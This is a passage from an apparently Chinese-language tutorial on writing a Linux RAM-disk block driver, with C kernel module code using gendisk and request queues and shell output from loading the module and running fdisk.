	newchrdev<span class="token punctuation">.</span>major <span class="token operator">=</span> <span class="token function">register_blkdev</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> RAMDISK_NAME<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* 由系统自动分配主设备号 */</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>major <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">goto</span> register_blkdev_fail<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>  
	<span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"ramdisk major = %drn"</span><span class="token punctuation">,</span> newchrdev<span class="token punctuation">.</span>major<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* 4、分配并初始化gendisk */</span>
	newchrdev<span class="token punctuation">.</span>gendisk <span class="token operator">=</span> <span class="token function">alloc_disk</span><span class="token punctuation">(</span>RADMISK_MINOR<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>newchrdev<span class="token punctuation">.</span>gendisk<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		ret <span class="token operator">=</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
		<span class="token keyword">goto</span> gendisk_alloc_fail<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

    <span class="token comment">/* 5、分配并初始化请求队列 */</span>
	newchrdev<span class="token punctuation">.</span>queue <span class="token operator">=</span> <span class="token function">blk_init_queue</span><span class="token punctuation">(</span>ramdisk_request_fn<span class="token punctuation">,</span> <span class="token operator">&amp;</span>newchrdev<span class="token punctuation">.</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>newchrdev<span class="token punctuation">.</span>queue<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		ret <span class="token operator">=</span> EINVAL<span class="token punctuation">;</span>
		<span class="token keyword">goto</span> blk_init_fail<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

    <span class="token comment">/* 6、添加(注册)disk
     * (1)、关联逻辑块设备和物理块设备
     * (2)、为物理块设备添加操作集和请求队列
     * (3)、为物理块设备设置属性
     */</span>
	newchrdev<span class="token punctuation">.</span>gendisk<span class="token operator">-&gt;</span>major <span class="token operator">=</span> newchrdev<span class="token punctuation">.</span>major<span class="token punctuation">;</span>		<span class="token comment">/* 主设备号 */</span>
	newchrdev<span class="token punctuation">.</span>gendisk<span class="token operator">-&gt;</span>first_minor <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>			<span class="token comment">/* 第一个次设备号(起始次设备号) */</span>
	newchrdev<span class="token punctuation">.</span>gendisk<span class="token operator">-&gt;</span>fops <span class="token operator">=</span> <span class="token operator">&amp;</span>ramdisk_fops<span class="token punctuation">;</span> 		<span class="token comment">/* 操作函数 */</span>
	newchrdev<span class="token punctuation">.</span>gendisk<span class="token operator">-&gt;</span>private_data <span class="token operator">=</span> <span class="token operator">&amp;</span>newchrdev<span class="token punctuation">;</span>	<span class="token comment">/* 私有数据 */</span>
	newchrdev<span class="token punctuation">.</span>gendisk<span class="token operator">-&gt;</span>queue <span class="token operator">=</span> newchrdev<span class="token punctuation">.</span>queue<span class="token punctuation">;</span>		<span class="token comment">/* 请求队列 */</span>
	<span class="token function">sprintf</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>gendisk<span class="token operator">-&gt;</span>disk_name<span class="token punctuation">,</span> RAMDISK_NAME<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* 名字 */</span>
	<span class="token function">set_capacity</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>gendisk<span class="token punctuation">,</span> RAMDISK_SIZE<span class="token operator">/</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">/* 设备容量(单位为扇区) */</span>
	<span class="token function">add_disk</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>gendisk<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
blk_init_fail<span class="token operator">:</span>
	<span class="token function">put_disk</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>gendisk<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">//del_gendisk(ramdisk.gendisk);</span>
gendisk_alloc_fail<span class="token operator">:</span>
	<span class="token function">unregister_blkdev</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>major<span class="token punctuation">,</span> RAMDISK_NAME<span class="token punctuation">)</span><span class="token punctuation">;</span>
register_blkdev_fail<span class="token operator">:</span>
	<span class="token function">kfree</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>ramdiskbuf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* 释放内存 */</span>
ram_fail<span class="token operator">:</span>
    <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/*
 * @description	: 驱动出口函数
 * @param 		: 无
 * @return 		: 无
 */</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">ramdisk_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"ramdisk exitrn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">/* 释放gendisk */</span>
	<span class="token function">del_gendisk</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>gendisk<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">put_disk</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>gendisk<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/* 清除请求队列 */</span>
	<span class="token function">blk_cleanup_queue</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/* 注销块设备 */</span>
	<span class="token function">unregister_blkdev</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>major<span class="token punctuation">,</span> RAMDISK_NAME<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/* 释放内存 */</span>
	<span class="token function">kfree</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>ramdiskbuf<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>

<span class="token function">module_init</span><span class="token punctuation">(</span>ramdisk_init<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">module_exit</span><span class="token punctuation">(</span>ramdisk_exit<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h2>
<a id="3_901"></a>3、测试</h2> 
<pre><code class="prism language-shell"><span class="token comment"># ls</span>
ramdisk.ko
<span class="token comment">#</span>
<span class="token comment"># insmod ramdisk.ko</span>
ramdisk init
ramdisk major <span class="token operator">=</span> <span class="token number">254</span>
ramdisk <span class="token function">open</span>
ramdisk release
<span class="token comment">#</span>
<span class="token comment"># ls -l /dev/ramdisk</span>
brw-rw----    <span class="token number">1</span> root     root      <span class="token number">254</span>,   <span class="token number">0</span> Jan  <span class="token number">1</span> 00:13 /dev/ramdisk
<span class="token comment">#</span>
<span class="token comment"># rmmod ramdisk.ko</span>
ramdisk <span class="token builtin class-name">exit</span>
<span class="token comment">#</span>
<span class="token comment"># ls -l /dev/ramdisk</span>
ls: /dev/ramdisk: No such <span class="token function">file</span> or directory
<span class="token comment">#</span>
<span class="token comment"># insmod ramdisk.ko</span>
ramdisk init
ramdisk major <span class="token operator">=</span> <span class="token number">254</span>
ramdisk <span class="token function">open</span>
ramdisk release
<span class="token comment">#</span>
<span class="token comment"># rmmod ramdisk.ko</span>
ramdisk <span class="token builtin class-name">exit</span>
<span class="token comment">#</span>
<span class="token comment"># insmod ramdisk.ko</span>
ramdisk init
ramdisk major <span class="token operator">=</span> <span class="token number">254</span>
ramdisk <span class="token function">open</span>
ramdisk release
<span class="token comment"># ls -l /dev/ramdisk</span>
brw-rw----    <span class="token number">1</span> root     root      <span class="token number">254</span>,   <span class="token number">0</span> Jan  <span class="token number">1</span> 00:14 /dev/ramdisk
<span class="token comment">#</span>
<span class="token comment"># fdisk -l</span>
Disk /dev/mmcblk0: <span class="token number">15</span> GB, <span class="token number">15931539456</span> bytes, <span class="token number">31116288</span> sectors
<span class="token number">1936</span> cylinders, <span class="token number">255</span> heads, <span class="token number">63</span> sectors/track
Units: sectors of <span class="token number">1</span> * <span class="token number">512</span> <span class="token operator">=</span> <span class="token number">512</span> bytes

Device       ramdisk <span class="token function">open</span>
Boot StartCHS    EndCHS        Stramdisk release
artLBA     EndLBA    Sectors  Sizramdisk <span class="token function">open</span>
e Id Type
/dev/mmcblk0p1    <span class="token number">0</span>,13ramdisk release
<span class="token number">0,3</span>     <span class="token number">1023,254</span>,63       <span class="token number">8192</span>   <span class="token number">31116287</span>   <span class="token number">31108096</span> <span class="token number">14</span>.8G  c Win95 FAT32 <span class="token punctuation">(</span>LBA<span class="token punctuation">)</span>
Disk /dev/mmcblk1: <span class="token number">7456</span> MB, <span class="token number">7818182656</span> bytes, <span class="token number">15269888</span> sectors
<span class="token number">238592</span> cylinders, <span class="token number">4</span> heads, <span class="token number">16</span> sectors/track
Units: sectors of <span class="token number">1</span> * <span class="token number">512</span> <span class="token operator">=</span> <span class="token number">512</span> bytes

Device       Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type
/dev/mmcblk1p1 *  <span class="token number">0,32</span>,33     <span class="token number">4,52</span>,48           <span class="token number">2048</span>      <span class="token number">67583</span>      <span class="token number">65536</span> <span class="token number">32</span>.0M  c Win95 FAT32 <span class="token punctuation">(</span>LBA<span class="token punctuation">)</span>
/dev/mmcblk1p2    <span class="token number">4,52</span>,49     <span class="token number">950,129</span>,11       <span class="token number">67584</span>   <span class="token number">15269887</span>   <span class="token number">15202304</span> 7423M <span class="token number">83</span> Linux
Disk /dev/mmcblk1boot1: <span class="token number">4</span> MB, <span class="token number">4194304</span> bytes, <span class="token number">8192</span> sectors
<span class="token number">128</span> cylinders, <span class="token number">4</span> heads, <span class="token number">16</span> sectors/track
Units: sectors of <span class="token number">1</span> * <span class="token number">512</span> <span class="token operator">=</span> <span class="token number">512</span> bytes

Disk /dev/mmcblk1boot1 doesn<span class="token string">'t contain a valid partition table
Disk /dev/mmcblk1boot0: 4 MB, 4194304 bytes, 8192 sectors
128 cylinders, 4 heads, 16 sectors/track
Units: sectors of 1 * 512 = 512 bytes

Disk /dev/mmcblk1boot0 doesn'</span>t contain a valid partition table
Disk /dev/ramdisk: <span class="token number">2</span> MB, <span class="token number">2097152</span> bytes, <span class="token number">4096</span> sectors
<span class="token number">32</span> cylinders, <span class="token number">2</span> heads, <span class="token number">64</span> sectors/track
Units: sectors of <span class="token number">1</span> * <span class="token number">512</span> <span class="token operator">=</span> <span class="token number">512</span> bytes

Disk /dev/ramdisk doesn't contain a valid partition table
<span class="token comment">#</span>
</code></pre> 
<h1>
<a id="_975"></a>六、内存模拟硬盘驱动编写(自定义请求队列)</h1> 
<p>参考：<code>driversblockzramzram_drv.c</code>。</p> 
<h2>
<a id="1_979"></a>1、编写思路</h2> 
<p>1、从 <code>RAM</code> 中分配内存。</p> 
<p>2、注册逻辑块设备，为应用层提供操作对象。</p> 
<p>3、设置“制造请求”函数。</p> 
<p>4、添加、初始化实际块设备，为驱动提供操作对象。</p> 
<p>5、通过注册的请求队列函数进行数据传输（可以使用内核提供，也可以自己进行构造）。</p> 
<h2>
<a id="2_991"></a>2、驱动实现</h2> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/init.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/module.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/slab.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/spinlock_types.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/fs.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/genhd.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/hdreg.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"linux/blkdev.h"</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">RAMDISK_SIZE</span>	<span class="token expression"><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">)</span> 	</span><span class="token comment">/* 容量大小为2MB */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">RAMDISK_NAME</span>	<span class="token string">"ramdisk"</span>			<span class="token comment">/* 名字 */</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">RADMISK_MINOR</span>	<span class="token expression"><span class="token number">3</span>					</span><span class="token comment">/* 表示有三个磁盘分区！不是次设备号为3！ */</span></span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>ramdiskbuf<span class="token punctuation">;</span>	<span class="token comment">/* ramdisk内存空间,用于模拟块设备 */</span>
    <span class="token class-name">spinlock_t</span> lock<span class="token punctuation">;</span>			<span class="token comment">/* 自旋锁 */</span>
    <span class="token keyword">int</span> major<span class="token punctuation">;</span>					<span class="token comment">/* 主设备号 */</span>
    <span class="token keyword">struct</span> <span class="token class-name">request_queue</span> <span class="token operator">*</span>queue<span class="token punctuation">;</span><span class="token comment">/* 请求队列 */</span>
    <span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span>gendisk<span class="token punctuation">;</span> 	<span class="token comment">/* gendisk */</span>
<span class="token punctuation">}</span><span class="token class-name">newchrdev_t</span><span class="token punctuation">;</span>
<span class="token class-name">newchrdev_t</span> newchrdev<span class="token punctuation">;</span>

<span class="token comment">/*
 * @description		: 打开块设备
 * @param - dev 	: 块设备
 * @param - mode 	: 打开模式
 * @return 			: 0 成功;其他 失败
 */</span>
<span class="token keyword">int</span> <span class="token function">ramdisk_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">block_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> <span class="token class-name">fmode_t</span> mode<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"ramdisk openrn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/*
 * @description		: 释放块设备
 * @param - disk 	: gendisk
 * @param - mode 	: 模式
 * @return 			: 0 成功;其他 失败
 */</span>
<span class="token keyword">void</span> <span class="token function">ramdisk_release</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">gendisk</span> <span class="token operator">*</span>disk<span class="token punctuation">,</span> <span class="token class-name">fmode_t</span> mode<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"ramdisk releasern"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/*
 * @description		: 获取磁盘信息
 * @param - dev 	: 块设备
 * @param - geo 	: 模式
 * @return 			: 0 成功;其他 失败
 */</span>
<span class="token keyword">int</span> <span class="token function">ramdisk_getgeo</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">block_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">hd_geometry</span> <span class="token operator">*</span>geo<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">/* 这是相对于机械硬盘的概念 */</span>
	geo<span class="token operator">-&gt;</span>heads <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>			<span class="token comment">/* 磁头 */</span>
	geo<span class="token operator">-&gt;</span>cylinders <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>	<span class="token comment">/* 柱面 */</span>
	geo<span class="token operator">-&gt;</span>sectors <span class="token operator">=</span> RAMDISK_SIZE <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token operator">*</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* 一个磁道上的扇区数量 */</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/* 
 * 块设备操作函数 
 */</span>
<span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">block_device_operations</span> ramdisk_fops <span class="token operator">=</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token punctuation">.</span>owner	 <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>open	 <span class="token operator">=</span> ramdisk_open<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>release <span class="token operator">=</span> ramdisk_release<span class="token punctuation">,</span>
	<span class="token punctuation">.</span>getgeo  <span class="token operator">=</span> ramdisk_getgeo<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span></span>
<span class="token comment">/*
 * @description	: 处理传输过程
 * @param-req 	: 请求
 * @return 		: 无
 */</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ramdisk_transfer</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">request</span> <span class="token operator">*</span>req<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>	
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> start <span class="token operator">=</span> <span class="token function">blk_rq_pos</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span>  	<span class="token comment">/* blk_rq_pos获取到的是扇区地址，左移9位转换为字节地址 */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> len  <span class="token operator">=</span> <span class="token function">blk_rq_cur_bytes</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">/* 大小   */</span>

	<span class="token comment">/* bio中的数据缓冲区
	 * 读：从磁盘读取到的数据存放到buffer中
	 * 写：buffer保存这要写入磁盘的数据
	 */</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>buffer <span class="token operator">=</span> <span class="token function">bio_data</span><span class="token punctuation">(</span>req<span class="token operator">-&gt;</span>bio<span class="token punctuation">)</span><span class="token punctuation">;</span>		
	
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">rq_data_dir</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">==</span> READ<span class="token punctuation">)</span> 		<span class="token comment">/* 读数据 */</span>
        <span class="token comment">/* 不同块设备，具体操作不同，RAM才可以使用memcpy进行处理 */</span>
		<span class="token function">memcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> newchrdev<span class="token punctuation">.</span>ramdiskbuf <span class="token operator">+</span> start<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">rq_data_dir</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">==</span> WRITE<span class="token punctuation">)</span> 	<span class="token comment">/* 写数据 */</span>
		<span class="token function">memcpy</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>ramdiskbuf <span class="token operator">+</span> start<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token comment">/*
 * @description	: 请求处理函数
 * @param-q 	: 请求队列
 * @return 		: 无
 */</span>
<span class="token keyword">void</span> <span class="token function">ramdisk_request_fn</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">request_queue</span> <span class="token operator">*</span>q<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> err <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">request</span> <span class="token operator">*</span>req<span class="token punctuation">;</span>

	<span class="token comment">/* 循环处理请求队列中的每个请求 */</span>
	req <span class="token operator">=</span> <span class="token function">blk_fetch_request</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span><span class="token punctuation">(</span>req <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

		<span class="token comment">/* 针对请求做具体的传输处理 */</span>
		<span class="token function">ramdisk_transfer</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">/* 判断是否为最后一个请求，如果不是的话就获取下一个请求
		 * 循环处理完请求队列中的所有请求。
		 */</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">__blk_end_request_cur</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">)</span>
			req <span class="token operator">=</span> <span class="token function">blk_fetch_request</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

<span class="token comment">/*
 * @description	: “制造请求”函数
 * @param-q 	: 请求队列
 * @return 		: 无
 */</span>
<span class="token keyword">void</span> <span class="token function">ramdisk_make_request_fn</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">request_queue</span> <span class="token operator">*</span>q<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">bio</span> <span class="token operator">*</span>bio<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span> offset<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">bio_vec</span> bvec<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">bvec_iter</span> iter<span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

	offset <span class="token operator">=</span> <span class="token punctuation">(</span>bio<span class="token operator">-&gt;</span>bi_iter<span class="token punctuation">.</span>bi_sector<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span>	<span class="token comment">/* 获取要操作的设备的偏移地址 */</span>

	<span class="token comment">/* 处理bio中的每个段 */</span>
	<span class="token function">bio_for_each_segment</span><span class="token punctuation">(</span>bvec<span class="token punctuation">,</span> bio<span class="token punctuation">,</span> iter<span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
		<span class="token keyword">char</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token function">page_address</span><span class="token punctuation">(</span>bvec<span class="token punctuation">.</span>bv_page<span class="token punctuation">)</span> <span class="token operator">+</span> bvec<span class="token punctuation">.</span>bv_offset<span class="token punctuation">;</span>
		len <span class="token operator">=</span> bvec<span class="token punctuation">.</span>bv_len<span class="token punctuation">;</span>

		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bio_data_dir</span><span class="token punctuation">(</span>bio<span class="token punctuation">)</span> <span class="token operator">==</span> READ<span class="token punctuation">)</span>	<span class="token comment">/* 读数据 */</span>
			<span class="token comment">/* 不同块设备，具体操作不同，RAM才可以使用memcpy进行处理 */</span>
			<span class="token function">memcpy</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> newchrdev<span class="token punctuation">.</span>ramdiskbuf <span class="token operator">+</span> offset<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bio_data_dir</span><span class="token punctuation">(</span>bio<span class="token punctuation">)</span> <span class="token operator">==</span> WRITE<span class="token punctuation">)</span>	<span class="token comment">/* 写数据 */</span>
			<span class="token function">memcpy</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>ramdiskbuf <span class="token operator">+</span> offset<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
		offset <span class="token operator">+=</span> len<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token function">set_bit</span><span class="token punctuation">(</span>BIO_UPTODATE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bio<span class="token operator">-&gt;</span>bi_flags<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">bio_endio</span><span class="token punctuation">(</span>bio<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">/*
 * @description	: 驱动出口函数
 * @param 		: 无
 * @return 		: 无
 */</span>
<span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">ramdisk_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"ramdisk initrn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/* 1、申请用于ramdisk内存 */</span>
	newchrdev<span class="token punctuation">.</span>ramdiskbuf <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span>RAMDISK_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>ramdiskbuf <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		ret <span class="token operator">=</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
		<span class="token keyword">goto</span> ram_fail<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

    <span class="token comment">/* 2、初始化自旋锁 */</span>
	<span class="token function">spin_lock_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>newchrdev<span class="token punctuation">.</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* 3、注册块设备(逻辑块设备：为应用层提供一个操作对象) */</span>
	newchrdev<span class="token punctuation">.</span>major <span class="token operator">=</span> <span class="token function">register_blkdev</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> RAMDISK_NAME<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* 由系统自动分配主设备号 */</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>newchrdev<span class="token punctuation">.</span>major <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">goto</span> register_blkdev_fail<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>  
	<span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"ramdisk major = %drn"</span><span class="token punctuation">,</span> newchrdev<span class="token punctuation">.</span>major<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* 4、分配并初始化gendisk */</span>
	newchrdev<span class="token punctuation">.</span>gendisk <span class="token operator">=</span> <span class="token function">alloc_disk</span><span class="token punctuation">(</span>RADMISK_MINOR<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>newchrdev<span class="token punctuation">.</span>gendisk<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		ret <span class="token operator">=</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
		<span class="token keyword">goto</span> gendisk_alloc_fail<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

    <span class="token comment">/* 5、分配并初始化请求队列 */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span></span>
